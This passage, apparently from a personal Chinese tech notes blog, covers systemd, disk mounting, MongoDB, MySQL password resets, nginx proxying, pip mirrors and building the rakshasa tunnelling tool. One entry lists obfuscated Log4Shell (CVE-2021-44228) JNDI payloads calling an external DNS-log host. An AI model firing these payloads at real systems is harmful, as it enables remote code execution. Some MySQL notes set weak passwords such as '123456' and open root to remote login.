<h4 id="0x1-启动服务"><a href="#0x1-启动服务" class="headerlink" title="0x1 启动服务"></a>0x1 启动服务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 重新读取所有配置文件，并启动</span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">service 服务名 start</span><br><span class="line"> </span><br><span class="line"># 终止服务</span><br><span class="line">service 服务名 stop</span><br><span class="line"> </span><br><span class="line"># 重启服务</span><br><span class="line">service 服务名 restart</span><br></pre></td></tr></table></figure>

<h4 id="0x2-启用-禁用开机自启"><a href="#0x2-启用-禁用开机自启" class="headerlink" title="0x2 启用&#x2F;禁用开机自启"></a>0x2 启用&#x2F;禁用开机自启</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启用开机自启</span><br><span class="line">systemctl enable 服务名</span><br><span class="line"> </span><br><span class="line"># 禁用开机自启</span><br><span class="line">systemctl disable 服务名</span><br></pre></td></tr></table></figure>


<h4 id="0x3-示例"><a href="#0x3-示例" class="headerlink" title="0x3 示例"></a>0x3 示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Elkeid Redis Server</span><br><span class="line">After·=network.target</span><br><span class="line">Documentation=http://redis.io/documentation, man:redis-server(1)</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">WorkingDirectory=/elkeid/redis</span><br><span class="line">ExecStart=/elkeid/redis/redis-server /elkeid/redis/redis.conf</span><br><span class="line">PIDFile=/elkeid/redis/elkeid-redis-server.pid</span><br><span class="line">Restart=always</span><br><span class="line">User=redis</span><br><span class="line">Group=redis</span><br><span class="line">RuntimeDirectory=redis</span><br><span class="line"></span><br><span class="line">PrivateTmp=yes</span><br><span class="line">LimitNOFILE=65535</span><br><span class="line">PrivateDevices=yes</span><br><span class="line">ProtectHome=yes</span><br><span class="line">CapabilityBoundingSet=~CAP_SYS_PTRACE</span><br><span class="line">ProtectSystem=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>linux下硬盘分区、格式、挂载</title>
    <url>/2024/09/10/linux%E4%B8%8B%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA%E3%80%81%E6%A0%BC%E5%BC%8F%E3%80%81%E6%8C%82%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="0xX-汇总版"><a href="#0xX-汇总版" class="headerlink" title="0xX 汇总版"></a>0xX 汇总版</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">fdisk /dev/vdb</span><br><span class="line">mkfs.ext4 /dev/vdb</span><br><span class="line">mkdir /data</span><br><span class="line">mount /dev/vdb /data</span><br><span class="line">echo  &#x27;/dev/vdb /data ext4 defaults 0 0&#x27; &gt;&gt; /etc/fstab</span><br></pre></td></tr></table></figure>

<h3 id="0x0-查看待使用的硬盘"><a href="#0x0-查看待使用的硬盘" class="headerlink" title="0x0 查看待使用的硬盘"></a>0x0 查看待使用的硬盘</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@test ops]# fdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/vda: 107.4 GB, 107374182400 bytes, 209715200 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label type: dos</span><br><span class="line">Disk identifier: 0x000c9a87</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/vda1   *        2048   209715166   104856559+  83  Linux</span><br><span class="line"></span><br><span class="line">Disk /dev/vdb: 2147.5 GB, 2147483648000 bytes, 4194304000 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line">[root@test /]#</span><br></pre></td></tr></table></figure>


<h3 id="0x1-分区"><a href="#0x1-分区" class="headerlink" title="0x1 分区"></a>0x1 分区</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@test /]# fdisk /dev/vdb</span><br><span class="line">Welcome to fdisk (util-linux 2.23.2).</span><br><span class="line"></span><br><span class="line">Changes will remain in memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write command.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table</span><br><span class="line">Building a new DOS disklabel with disk identifier 0x9f371d89.</span><br><span class="line"></span><br><span class="line">Command (m for help): n</span><br><span class="line">Partition type:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p</span><br><span class="line">Partition number (1-4, default 1): 1</span><br><span class="line">First sector (2048-4194303999, default 2048): </span><br><span class="line">Using default value 2048</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-4194303999, default 4194303999): </span><br><span class="line">Using default value 4194303999</span><br><span class="line">Partition 1 of type Linux and of size 2 TiB is set</span><br><span class="line"></span><br><span class="line">Command (m for help): q</span><br><span class="line"></span><br><span class="line">[root@test /]#</span><br></pre></td></tr></table></figure>


<h3 id="0x2-格式化"><a href="#0x2-格式化" class="headerlink" title="0x2 格式化"></a>0x2 格式化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@test /]# mkfs.ext4 /dev/vdb</span><br><span class="line">mke2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">Filesystem label=</span><br><span class="line">OS type: Linux</span><br><span class="line">Block size=4096 (log=2)</span><br><span class="line">Fragment size=4096 (log=2)</span><br><span class="line">Stride=0 blocks, Stripe width=0 blocks</span><br><span class="line">131072000 inodes, 524288000 blocks</span><br><span class="line">26214400 blocks (5.00%) reserved for the super user</span><br><span class="line">First data block=0</span><br><span class="line">Maximum filesystem blocks=2671771648</span><br><span class="line">16000 block groups</span><br><span class="line">32768 blocks per group, 32768 fragments per group</span><br><span class="line">8192 inodes per group</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, </span><br><span class="line">        4096000, 7962624, 11239424, 20480000, 23887872, 71663616, 78675968, </span><br><span class="line">        102400000, 214990848, 512000000</span><br><span class="line"></span><br><span class="line">Allocating group tables: done                            </span><br><span class="line">Writing inode tables: done                            </span><br><span class="line">Creating journal (32768 blocks): done</span><br><span class="line">Writing superblocks and filesystem accounting information: done</span><br><span class="line"></span><br><span class="line">[root@test /]#</span><br></pre></td></tr></table></figure>


<h3 id="0x4-挂载"><a href="#0x4-挂载" class="headerlink" title="0x4 挂载"></a>0x4 挂载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@test /]# mkdir /data   #新建一个目录用于挂载硬盘</span><br><span class="line">[root@test /]# mount /dev/vdb /data   #挂载</span><br><span class="line">[root@test /]# df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs        7.7G     0  7.7G   0% /dev</span><br><span class="line">tmpfs           7.7G     0  7.7G   0% /dev/shm</span><br><span class="line">tmpfs           7.7G  452K  7.7G   1% /run</span><br><span class="line">tmpfs           7.7G     0  7.7G   0% /sys/fs/cgroup</span><br><span class="line">/dev/vda1        99G  5.3G   89G   6% /</span><br><span class="line">tmpfs           1.6G     0  1.6G   0% /run/user/1000</span><br><span class="line">/dev/vdb        2.0T   81M  1.9T   1% /data</span><br><span class="line">[root@test /]#</span><br></pre></td></tr></table></figure>

<h3 id="0x5-设置开机自动挂载"><a href="#0x5-设置开机自动挂载" class="headerlink" title="0x5 设置开机自动挂载"></a>0x5 设置开机自动挂载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@test /]# echo  &#x27;/dev/vdb /data ext4 defaults 0 0&#x27; &gt;&gt; /etc/fstab</span><br><span class="line">[root@test /]# cat /etc/fstab </span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># /etc/fstab</span><br><span class="line"># Created by anaconda on Tue Mar 22 07:12:23 2022</span><br><span class="line">#</span><br><span class="line"># Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;</span><br><span class="line"># See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</span><br><span class="line">#</span><br><span class="line">UUID=9c8d46a4-6089-4e07-91bf-e6b0ee93c966 /                       ext4    defaults        1 1</span><br><span class="line">/dev/vdb /data ext4 defaults 0 0</span><br><span class="line">[root@test /]#</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>log4j漏洞POC</title>
    <url>/2024/09/10/log4j%E6%BC%8F%E6%B4%9EPOC/</url>
    <content><![CDATA[<h4 id="0x1-POC"><a href="#0x1-POC" class="headerlink" title="0x1 POC"></a>0x1 POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;x:n:-j&#125;ndi:l$&#123;n:d:-d&#125;ap://.$&#123;hostName&#125;.1artx0sjpe5u.alibaba-ddns.icu/l1&#125; </span><br><span class="line">$&#123;jndi:ldap://log4j.1artx0sjpe5u.alibaba-ddns.icu:1389/$&#123;java:version&#125;&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://lo.1artx0sjpe5u.alibaba-ddns.icu:1389/ass&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://lo.1artx0sjpe5u.alibaba-ddns.icu:1389/ass&#125;</span><br><span class="line">$&#123;jndi:rmi://lo.1artx0sjpe5u.alibaba-ddns.icu&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://lo.1artx0sjpe5u.alibaba-ddns.icu/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://lo.1artx0sjpe5u.alibaba-ddns.icu/poc&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x2-Header"><a href="#0x2-Header" class="headerlink" title="0x2 Header"></a>0x2 Header</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: xxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="0x3-LINK"><a href="#0x3-LINK" class="headerlink" title="0x3 LINK:"></a>0x3 LINK:</h4><p><a href="https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words">https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words</a></p>
]]></content>
  </entry>
  <entry>
    <title>mongodb 命令使用</title>
    <url>/2024/09/10/mongodb-%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.mongodb.com/try/download/community</span><br></pre></td></tr></table></figure>


<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use zeus</span><br><span class="line">db.createUser(&#123;user:&quot;zeus&quot;,pwd:&quot;&lt;密码&gt;&quot;,roles:[&#123;role:&quot;readWrite&quot;,db:&quot;zeus&quot;&#125;]&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="更改字段名"><a href="#更改字段名" class="headerlink" title="更改字段名"></a>更改字段名</h3><h4 id="使用-rename操作："><a href="#使用-rename操作：" class="headerlink" title="使用$rename操作："></a>使用$rename操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">  &#123; &#125;, // 查询条件，可以为空以匹配所有文档</span><br><span class="line">  &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">      &quot;oldFieldName&quot;: &quot;newFieldName&quot; // 将旧字段名重命名为新字段名</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; multi: true &#125; // 如果需要更新多个文档，添加该选项</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4 id="使用-set操作："><a href="#使用-set操作：" class="headerlink" title="使用$set操作："></a>使用$set操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">  &#123; &#125;, // 查询条件，可以为空以匹配所有文档</span><br><span class="line">  &#123;</span><br><span class="line">    $set: &#123;</span><br><span class="line">      newFieldName: &quot;$oldFieldName&quot; // 设置新字段名并保留旧字段值</span><br><span class="line">    &#125;,</span><br><span class="line">    $unset: &#123; &quot;oldFieldName&quot;: &quot;&quot; &#125; // 删除旧字段</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; multi: true &#125; // 如果需要更新多个文档，添加该选项</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="修改指定条件的数据"><a href="#修改指定条件的数据" class="headerlink" title="修改指定条件的数据"></a>修改指定条件的数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;63f5e2ed7a2e3b097984c2f5&quot;), &quot;id&quot; : &quot;6a6a51dd&quot;, &quot;username&quot; : &quot;john&quot;, &quot;password&quot; : &quot;123123&quot;, &quot;last_time&quot; : &quot;2023-02-22 17:39:57&quot;, &quot;role&quot; : &quot;0&quot; &#125;  </span><br><span class="line">db.collection.update(</span><br><span class="line">  &#123; &quot;role&quot;: &quot;0&quot; &#125;, // 查询条件，匹配 role 等于 &quot;0&quot; 的文档</span><br><span class="line">  &#123;</span><br><span class="line">    $set: &#123; &quot;role&quot;: &quot;admin&quot; &#125; // 更新 role 字段的值为 &quot;admin&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; multi: true &#125; // 如果有多个匹配的文档，需要添加此选项</span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>mysql 5.7 忘记密码-密码重置</title>
    <url>/2024/09/10/mysql-5-7-%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81-%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="0x1-停止服务"><a href="#0x1-停止服务" class="headerlink" title="0x1 停止服务"></a>0x1 停止服务</h3><blockquote>
<p>不同操作系统停止服务方式不一样</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop mysqld </span><br><span class="line"></span><br><span class="line">systemctl status mysqld   #查看状态</span><br></pre></td></tr></table></figure>



<h3 id="0x2-更新配置"><a href="#0x2-更新配置" class="headerlink" title="0x2 更新配置"></a>0x2 更新配置</h3><p>在 <strong>&#x2F;etc&#x2F;my.cnf</strong> 中添加如下配置项,即可跳过登录认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">skip_grant_tables=1</span><br></pre></td></tr></table></figure>
<p>更新完后然后启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start mysqld </span><br></pre></td></tr></table></figure>

<h3 id="0x3-更改密码"><a href="#0x3-更改密码" class="headerlink" title="0x3 更改密码"></a>0x3 更改密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&gt; mysql</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; update user set authentication_string=&#x27;root&#x27; where user=&#x27;root&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br></pre></td></tr></table></figure>

<h3 id="0x4-删除配置文件"><a href="#0x4-删除配置文件" class="headerlink" title="0x4 删除配置文件"></a>0x4 删除配置文件</h3><p>编辑 &#x2F;etc&#x2F;my.cnf 把 “skip_grant_tables&#x3D;1” 删除即可</p>
<h3 id="0x5-一些命令和坑"><a href="#0x5-一些命令和坑" class="headerlink" title="0x5 一些命令和坑"></a>0x5 一些命令和坑</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update mysql.user set authentication_string=password(&#x27;root&#x27;)  where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br><span class="line"></span><br><span class="line">update user set authentication_string=&#x27;root&#x27; where user=&#x27;root&#x27;;</span><br><span class="line"></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;root&#x27; WITH GRANT OPTION;</span><br><span class="line"></span><br><span class="line">ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED  BY &quot;123456&quot;;</span><br><span class="line"></span><br><span class="line">set global validate_password.length=4;</span><br><span class="line"></span><br><span class="line">set global validate_password.policy=LOW; </span><br><span class="line"></span><br><span class="line">SHOW VARIABLES LIKE &#x27;validate_password%&#x27;;</span><br><span class="line"></span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH MYSQL_NATIVE_PASSWORD BY &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">select host,user from user;</span><br><span class="line"></span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;123456&#x27; PASSWORD EXPIRE NEVER;</span><br></pre></td></tr></table></figure>

<h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;123456&#x27; PASSWORD EXPIRE NEVER;</span><br></pre></td></tr></table></figure>

<h4 id="获取第一次安装密码"><a href="#获取第一次安装密码" class="headerlink" title="获取第一次安装密码"></a>获取第一次安装密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br></pre></td></tr></table></figure>

<h4 id="此前安装过要删除旧数据"><a href="#此前安装过要删除旧数据" class="headerlink" title="此前安装过要删除旧数据"></a>此前安装过要删除旧数据</h4><p>删除原来安装过的mysql残留的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /var/lib/mysql</span><br></pre></td></tr></table></figure>

<h4 id="开启远程登录"><a href="#开启远程登录" class="headerlink" title="开启远程登录"></a>开启远程登录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.连接服务器: mysql -u root -p</span><br><span class="line">2.看当前所有数据库：show databases;</span><br><span class="line">3.进入mysql数据库：use mysql;</span><br><span class="line">4.查看mysql数据库中所有的表：show tables;</span><br><span class="line">5.查看user表中的数据：select Host, User,Password from user;</span><br><span class="line">6.修改user表中的Host:   update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;;  </span><br><span class="line">  - 说明： % 代表任意的客户端,可替换成具体IP地址。</span><br><span class="line">7.最后刷新一下：flush privileges;</span><br><span class="line">8. 注意：一定要记得在写sql的时候要在语句完成后加上&quot; ; &quot;</span><br></pre></td></tr></table></figure>

<h4 id="配置默认编码为utf8"><a href="#配置默认编码为utf8" class="headerlink" title="配置默认编码为utf8"></a>配置默认编码为utf8</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf #添加 [mysqld] character_set_server=utf8 init_connect=&#x27;SET NAMES utf8&#x27;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>nginx常规配置和代理配置</title>
    <url>/2024/09/10/nginx%E5%B8%B8%E8%A7%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h4 id="0x0-配置一"><a href="#0x0-配置一" class="headerlink" title="0x0 配置一"></a>0x0 配置一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">	listen 3000;</span><br><span class="line">        server_name localhost;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">        #重写后端服务器的location和refresh头</span><br><span class="line">        #proxy_redirect on;  </span><br><span class="line">        location / &#123;</span><br><span class="line">           	root /usr/www/wkg;</span><br><span class="line">		index index.html index.htm;</span><br><span class="line">		try_files $uri $uri/ /index.html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	location /api/ &#123;</span><br><span class="line">		proxy_pass http://127.0.0.1:7788/;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	location /ws/ &#123;</span><br><span class="line">		</span><br><span class="line">		proxy_pass http://127.0.0.1:7788/;</span><br><span class="line">		proxy_http_version 1.1;</span><br><span class="line">            	proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">		proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x1-配置二"><a href="#0x1-配置二" class="headerlink" title="0x1 配置二"></a>0x1 配置二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">  upstream grpcservers &#123; server 10.43.48.14:6751;&#125;</span><br><span class="line">  server &#123;</span><br><span class="line">      listen 8090;</span><br><span class="line">  	listen [::]:8090;</span><br><span class="line">  	proxy_pass grpcservers;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x2配置三"><a href="#0x2配置三" class="headerlink" title="0x2配置三"></a>0x2配置三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load_module /usr/lib64/nginx/modules/ngx_stream_module.so;</span><br><span class="line"></span><br><span class="line">#stream &#123;</span><br><span class="line">#    upstream manager &#123;</span><br><span class="line">#        server 10.43.48.14:8082;</span><br><span class="line">#    &#125;</span><br><span class="line">#    server &#123;</span><br><span class="line">#        listen 80; </span><br><span class="line">#        proxy_pass manager;</span><br><span class="line">#    &#125;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">events&#123;</span><br><span class="line">	worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stream&#123;</span><br><span class="line">	upstream kafka &#123; server 10.43.48.22:9092;&#125;</span><br><span class="line">	server&#123;</span><br><span class="line">	 listen 443;</span><br><span class="line">	 listen [::]:443;</span><br><span class="line">	 proxy_pass kafka;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">        upstream localserver &#123;</span><br><span class="line">           server 10.43.48.14:8082;</span><br><span class="line">        &#125;</span><br><span class="line">	</span><br><span class="line">	upstream manager &#123;</span><br><span class="line">	  server 10.43.48.44:6701;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	server&#123;	</span><br><span class="line">	  listen 80;</span><br><span class="line">	  location / &#123;</span><br><span class="line">	     proxy_pass http://localserver;</span><br><span class="line">	     proxy_set_header Host $host;</span><br><span class="line">	   &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	server&#123;</span><br><span class="line">	  listen 6701;</span><br><span class="line">	  location / &#123;</span><br><span class="line">		proxy_pass http://manager;	</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>python pip国内源</title>
    <url>/2024/08/10/python-pip%E5%9B%BD%E5%86%85%E6%BA%90/</url>
    <content><![CDATA[<h3 id="1-指定包名安装，package改成要安装的包名"><a href="#1-指定包名安装，package改成要安装的包名" class="headerlink" title="1.指定包名安装，package改成要安装的包名"></a>1.指定包名安装，package改成要安装的包名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install package -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>
<h3 id="2-依据requirements-txt安装"><a href="#2-依据requirements-txt安装" class="headerlink" title="2.依据requirements.txt安装"></a>2.依据requirements.txt安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>

<h3 id="3-设置为全局源"><a href="#3-设置为全局源" class="headerlink" title="3.设置为全局源"></a>3.设置为全局源</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url mirrors.aliyun.com/pypi</span><br><span class="line">pip config set install.trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>


<h3 id="4-国内常用镜像"><a href="#4-国内常用镜像" class="headerlink" title="4.国内常用镜像"></a>4.国内常用镜像</h3><p><a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a>     #清华<br><a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a>       #阿里云<br><a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a>     #中国科技大学<br><a href="http://pypi.hustunique.com/">http://pypi.hustunique.com/</a>                  #华中理工大学<br><a href="http://pypi.sdutlinux.org/">http://pypi.sdutlinux.org/</a>                   #山东理工大学<br><a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a>               #豆瓣   </p>
]]></content>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>python字节数组转字符串</title>
    <url>/2024/09/10/python%E5%AD%97%E8%8A%82%E6%95%B0%E7%BB%84%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p>动态调试前端的时候IV和KEY会有字符数组的形式显示，如下脚本用来转换一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 整数数组</span><br><span class="line">int_array = [1937195085, 910244211, 1433482853, 593061668]</span><br><span class="line"># 将整数数组转换为字节</span><br><span class="line">byte_array = bytes()</span><br><span class="line">for num in int_array:</span><br><span class="line">    byte_array += num.to_bytes(4, byteorder=&#x27;big&#x27;)</span><br><span class="line"></span><br><span class="line"># 将字节转换为字符串</span><br><span class="line">result_string = byte_array.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;转换后的字符串:&quot;, result_string)</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>rakshasa 代理工具简单使用</title>
    <url>/2024/09/10/rakshasa-%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="0x0-测试环境"><a href="#0x0-测试环境" class="headerlink" title="0x0 测试环境"></a>0x0 测试环境</h3><p>服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统：centos 7</span><br><span class="line">IP：42.13.23.62</span><br></pre></td></tr></table></figure>
<p>客户端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统: centos 7</span><br><span class="line">IP： 10.20.20.88</span><br></pre></td></tr></table></figure>

<h3 id="0x1-反向代理ssh"><a href="#0x1-反向代理ssh" class="headerlink" title="0x1 反向代理ssh"></a>0x1 反向代理ssh</h3><h4 id="首先自己下载源码编译一份"><a href="#首先自己下载源码编译一份" class="headerlink" title="首先自己下载源码编译一份"></a>首先自己下载源码编译一份</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ https://github.com/Mob2003/rakshasa</span><br><span class="line">$ cd rakshasa</span><br></pre></td></tr></table></figure>

<h3 id="设置环境"><a href="#设置环境" class="headerlink" title="设置环境"></a>设置环境</h3><p>1.安装golang环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install goalng</span><br><span class="line">或者</span><br><span class="line">手动下载安装</span><br></pre></td></tr></table></figure>
<p>2.设置国内的代理 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>

<p>3.编译<br>为什么需要重新编译呢，因为官方的二进制包内置了默认的证书，该证书已经公开且泄露了，所以自己重新生成证书再编译，确保信息不会泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重新生成一份证书，默认证书已经泄露</span><br><span class="line">go run build.go -gencert</span><br><span class="line"></span><br><span class="line">生成可执行文件</span><br><span class="line">go run build.go -fullnode</span><br><span class="line"></span><br><span class="line">生成所有端的可执行文件，看个人需求了</span><br><span class="line">go run build -all</span><br></pre></td></tr></table></figure>
<p>如果使用-all参数编译好后，会在当前bin目录生成所有端的可执行文件 </p>
